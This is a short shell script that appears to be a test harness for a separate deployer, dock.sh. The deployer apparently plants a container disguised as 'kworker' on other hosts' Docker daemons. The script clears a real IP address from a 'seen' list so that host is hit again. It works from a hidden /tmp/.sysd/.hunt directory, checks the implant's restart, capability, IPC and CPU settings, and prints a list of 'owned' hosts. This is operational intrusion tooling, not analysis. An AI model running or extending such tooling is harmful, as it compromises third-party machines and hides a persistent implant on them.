#!/bin/sh
# throwaway: exercise both dock.sh branches (grep -v > f ; mv, never && mv)
W=/tmp/.sysd/.hunt
say() { echo "--- $1 ---"; }

say "A: reuse path (our container already there)"
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.1; mv -f /tmp/s.1 "$W/dock.seen"
sh /tmp/.sysd/dock.sh 2>&1 | grep -E 'queue|daemon|already runs|restarted|DEPLOYED' || true

say "B: recreate path (container removed -> new HostConfig)"
docker rm -f kworker >/dev/null 2>&1 || true
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.2; mv -f /tmp/s.2 "$W/dock.seen"
sh /tmp/.sysd/dock.sh 2>&1 | grep -E 'queue|daemon|pulling|DEPLOYED|failed' || true

say "verify: container + flags + logs"
docker ps
docker inspect -f 'restart={{.HostConfig.RestartPolicy.Name}} caps={{.HostConfig.CapAdd}} ipc={{.HostConfig.IpcMode}} cpu={{.HostConfig.CpuShares}}' kworker 2>&1
docker logs --tail 5 kworker 2>&1 | tail -5
say "owned"
cat "$W/dock.owned"
